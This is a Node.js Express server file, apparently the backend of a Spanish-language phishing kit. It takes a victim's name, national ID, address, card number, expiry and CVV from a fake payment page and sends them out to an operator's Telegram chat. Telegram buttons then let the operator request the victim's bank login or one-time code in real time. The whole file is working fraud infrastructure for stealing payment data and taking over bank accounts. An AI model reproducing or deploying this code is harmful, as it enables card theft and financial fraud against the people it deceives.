// server.js
import express from "express";
import cors from "cors";
import bodyParser from "body-parser";
import dotenv from "dotenv";
import fetch from "node-fetch";
dotenv.config();

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static("public"));

const estados = {}; // memoria temporal

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error("⚠️ Variables de entorno faltantes");
  process.exit(1);
}

// ENVIAR DATOS DESDE payment.html
app.post("/enviar", async (req, res) => {
  const data = req.body;
  if (!data) return res.status(400).json({status:"error", message:"Datos inválidos"});

  const id = Date.now().toString(36);
  estados[id] = null;

  const message = `
<b>Nuevo pago pendiente</b>
-----------------------
👤 <b>Nombre:</b> ${data.nombre}
🆔 <b>Cédula:</b> ${data.id}
📧 <b>Email:</b> ${data.email}
📞 <b>Celular:</b> ${data.celular}
🏠 <b>Dirección:</b> ${data.direccion}
🏦 <b>Banco:</b> ${data.banco}
💳 <b>Tarjeta:</b> ${data.tarjeta}
📅 <b>Fecha:</b> ${data.ftarjeta}
🔐 <b>CVV:</b> ${data.cvv}
🌐 <b>IP:</b> ${data.ip}
-----------------------
`;

  const keyboard = JSON.stringify({
    inline_keyboard: [
      [{ text: "Pedir Logo", callback_data: `logo_${id}` }],
      [{ text: "Pedir Dinámica", callback_data: `dinamica_${id}` }],
      [{ text: "Error TC", callback_data: `error_tc_${id}` }],
      [{ text: "Error Logo", callback_data: `error_logo_${id}` }],
      [{ text: "Finalizar", callback_data: `finalizar_${id}` }]
    ]
  });

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{
    method:"POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML",
      reply_markup: keyboard
    })
  });

  return res.json({status:"ok", id});
});

// WEBHOOK TELEGRAM
app.post("/webhook", (req,res)=>{
  const update = req.body;
  if (update.callback_query){
    const actionData = update.callback_query.data;
    const [action,id] = actionData.split("_");

    estados[id] = action;

    // responder Telegram
    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`,{
      method:"POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({
        callback_query_id: update.callback_query.id,
        text: "✅ Acción recibida"
      })
    });

    console.log(`Botón pulsado: ${action} para ${id}`);
  }
  res.sendStatus(200);
});

// CONSULTAR ESTADO
app.get("/estado/:id", (req,res)=>{
  const id = req.params.id;
  const estado = estados[id] || null;
  res.json({estado});
});

// INICIAR
const port = process.env.PORT || 3000;
app.listen(port, ()=>{
  console.log(`🚀 escuchando en puerto ${port}`);
});
